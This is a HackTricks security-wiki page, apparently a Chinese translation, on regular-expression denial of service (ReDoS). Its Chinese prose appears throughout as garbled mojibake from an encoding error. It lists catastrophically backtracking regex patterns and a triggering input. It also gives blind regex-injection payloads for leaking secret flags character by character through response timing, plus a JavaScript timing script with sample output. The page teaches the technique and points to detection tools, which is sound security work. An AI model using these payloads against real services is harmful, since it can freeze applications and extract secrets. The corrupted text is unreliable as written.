# æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ - ReDoS

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

# æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ (ReDoS)

**æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ (ReDoS)** æ˜¯æŒ‡æœ‰äººåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼ˆç”¨äºæœç´¢å’ŒåŒ¹é…æ–‡æœ¬ä¸­çš„æ¨¡å¼çš„ä¸€ç§æ–¹å¼ï¼‰å·¥ä½œä¸­çš„å¼±ç‚¹ã€‚æœ‰æ—¶ï¼Œå½“ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå®ƒä»¬å¯èƒ½ä¼šå˜å¾—éå¸¸æ…¢ï¼Œå°¤å…¶æ˜¯å½“å®ƒä»¬å¤„ç†çš„æ–‡æœ¬å˜å¾—æ›´å¤§æ—¶ã€‚è¿™ç§ç¼“æ…¢å¯èƒ½ä¼šå˜å¾—éå¸¸ä¸¥é‡ï¼Œç”šè‡³åœ¨æ–‡æœ¬å¤§å°ç¨å¾®å¢åŠ æ—¶å°±ä¼šè¿…é€Ÿå¢é•¿ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªé—®é¢˜ä½¿ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„ç¨‹åºé•¿æ—¶é—´æ— æ³•æ­£å¸¸å·¥ä½œã€‚

## æœ‰é—®é¢˜çš„æ­£åˆ™è¡¨è¾¾å¼å¤©çœŸç®—æ³•

**æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**

## æ¶æ„æ­£åˆ™è¡¨è¾¾å¼ <a href="#evil-regexes" id="evil-regexes"></a>

æ¶æ„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æ˜¯æŒ‡é‚£äº›**åœ¨ç‰¹åˆ¶è¾“å…¥ä¸Šå¡ä½å¯¼è‡´æ‹’ç»æœåŠ¡**çš„æ¨¡å¼ã€‚æ¶æ„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼é€šå¸¸åŒ…å«é‡å¤çš„åˆ†ç»„å’Œé‡å¤æˆ–äº¤æ›¿çš„é‡å åœ¨é‡å¤ç»„å†…ã€‚ä¸€äº›æ¶æ„æ¨¡å¼çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} for x > 10

æ‰€æœ‰è¿™äº›éƒ½å¯¹è¾“å…¥ `aaaaaaaaaaaaaaaaaaaaaaaa!` æ˜“å—æ”»å‡»ã€‚

## ReDoS æœ‰æ•ˆè½½è·

### é€šè¿‡ ReDoS å­—ç¬¦ä¸²å¤–æ³„

åœ¨ CTFï¼ˆæˆ–æ¼æ´èµé‡‘ï¼‰ä¸­ï¼Œä¹Ÿè®¸ä½ **æ§åˆ¶äº†ä¸æ•æ„Ÿä¿¡æ¯ï¼ˆæ ‡å¿—ï¼‰åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼**ã€‚ç„¶åï¼Œå¦‚æœæ­£åˆ™è¡¨è¾¾å¼**åŒ¹é…**ï¼Œä½¿**é¡µé¢å†»ç»“ï¼ˆè¶…æ—¶æˆ–æ›´é•¿å¤„ç†æ—¶é—´ï¼‰**å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ï¼Œè€Œ**å¦‚æœæ²¡æœ‰åŒ¹é…åˆ™ä¸å†»ç»“**ã€‚è¿™æ ·ä½ å°±å¯ä»¥**é€å­—ç¬¦å¤–æ³„**å­—ç¬¦ä¸²ï¼š

* åœ¨ [**è¿™ç¯‡æ–‡ç« **](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) ä¸­ä½ å¯ä»¥æ‰¾åˆ°è¿™ä¸ª ReDoS è§„åˆ™ï¼š`^(?=<flag>)((.*)*)*salt$`
* ç¤ºä¾‹ï¼š`^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* åœ¨ [**è¿™ç¯‡å†™ä½œ**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) ä¸­ä½ å¯ä»¥æ‰¾åˆ°è¿™ä¸ªï¼š`<flag>(((((((.*)*)*)*)*)*)*)!`
* åœ¨ [**è¿™ç¯‡å†™ä½œ**](https://ctftime.org/writeup/25869) ä¸­ä»–ä½¿ç”¨äº†ï¼š`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS æ§åˆ¶è¾“å…¥å’Œæ­£åˆ™è¡¨è¾¾å¼

ä»¥ä¸‹æ˜¯**ReDoS**ç¤ºä¾‹ï¼Œå…¶ä¸­ä½ **æ§åˆ¶**è¾“å…¥å’Œ**æ­£åˆ™è¡¨è¾¾å¼**ï¼š
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## å·¥å…·

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## å‚è€ƒ
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
